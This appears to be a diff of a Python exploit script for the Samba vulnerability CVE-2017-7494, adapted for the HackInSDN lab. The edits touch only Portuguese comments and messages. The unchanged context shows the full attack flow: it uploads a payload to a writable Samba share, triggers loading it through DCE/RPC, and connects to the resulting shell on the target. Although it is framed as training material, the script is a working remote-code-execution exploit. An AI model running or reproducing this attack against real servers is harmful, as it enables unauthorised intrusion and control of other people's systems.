@@ -3,7 +3,7 @@
 
 """
     Exploit red-wheelbarrow (CVE-2017-7494)
-    Versão adaptada pro lab HackInSDN (FelipeR)
+    Versão pro lab HackInSDN (FelipeR)
 """
 
 import sys
@@ -27,13 +27,13 @@ def dce_trigger(dce):
     try:
         dce.connect()
     except SessionError as e:
-        # Exceção esperada: o módulo carrega e quebra — isso é normal no trigger.
+        # Except esperada, o módulo carrega e quebra.
         print(f"[INFO] Exceção esperada do Samba (SessionError): {e}")
     except Exception as e:
         print(f"[ERRO] Algo deu errado ao acionar o DCE: {e}")
 
 def receive_and_print(sock):
-    """Thread que recebe e imprime o que vier do shell reverso (se houver)."""
+    """Thread que recebe e printa o que vier do shell reverso (se houver)."""
     try:
         while True:
             data = sock.recv(1024)
@@ -45,7 +45,7 @@ def receive_and_print(sock):
     except Exception as e:
         print(f"\n[ERRO] Erro na thread de recepção: {e}")
 
-# Função principal do exploit
+# Função principal 
 def exploit(target, port, executable_path, remote_share, remote_path, user, password, shell_port):
     """Executa o fluxo principal do exploit."""
 
@@ -78,14 +78,14 @@ def exploit(target, port, executable_path, remote_share, remote_path, user, pass
         print("[INFO] Tentando acesso anônimo (sem usuário/senha)...")
 
     # Upload do payload
-    print(f"[*] Enviando payload ({payload_name}) pra partilha '{remote_share}'...")
+    print(f"[*] Enviando payload ({payload_name}) pra pasta compartilhada '{remote_share}'...")
     try:
         with open(executable_path, 'rb') as f:
             smb_client.putFile(remote_share, payload_name, f.read)
         print("[OK] Payload enviado.")
     except Exception as e:
         print(f"[ERRO] Não foi possível enviar o payload pra '{remote_share}': {e}")
-        print("[INFO] Confere se a partilha existe e se tem permissão de escrita.")
+        print("[INFO] Confere se a pasta compartilhada existe e se tem permissão de escrita.")
         return
 
     # Acionar o exploit
@@ -107,7 +107,7 @@ def exploit(target, port, executable_path, remote_share, remote_path, user, pass
     print("[INFO] Trigger disparado em background. Aguardando 2 segundos...")
     time.sleep(2)
 
-    # Se não foi passada porta de shell, terminamos por aqui
+    # Se não foi passada porta de shell, terminamos 
     if not shell_port:
         print("[OK] Pronto — payload (provavelmente) executado no alvo.")
         print("[INFO] Sem porta de shell informada, não tem mais o que fazer.")
@@ -120,7 +120,7 @@ def exploit(target, port, executable_path, remote_share, remote_path, user, pass
         sock.connect((target, int(shell_port)))
         print(f"[OK] Conectado ao shell em {target}:{shell_port}.")
 
-        # Inicia thread que imprime o que chegar
+        # Inicia thread que imprime oq chegar
         receive_thread = Thread(target=receive_and_print, args=(sock,))
         receive_thread.daemon = True
         receive_thread.start()
@@ -136,7 +136,7 @@ def exploit(target, port, executable_path, remote_share, remote_path, user, pass
     except Exception as e:
         print(f"[ERRO] Não foi possível conectar ao shell reverso: {e}")
 
-# Ponto de entrada
+# Input 
 if __name__ == "__main__":
     parser = ArgumentParser(description="Exploit red-wheelbarrow (CVE-2017-7494) - (HackInSDN)")
     
@@ -145,7 +145,7 @@ if __name__ == "__main__":
     parser.add_argument("-s", "--remoteshare", required=True, help="Share de escrita no alvo (ex: 'public')")
     parser.add_argument("-r", "--remotepath", required=True, help="Caminho completo do payload no alvo (ex: '/tmp/payload.sh')")
     
-    # Argumentos opcionais
+    # Opcionais
     parser.add_argument("-u", "--user", required=False, help="Usuário Samba (opcional)")
     parser.add_argument("-p", "--password", required=False, help="Senha Samba (opcional)")
     parser.add_argument("-P", "--remoteshellport", required=False, help="Porta do shell reverso (opcional)")
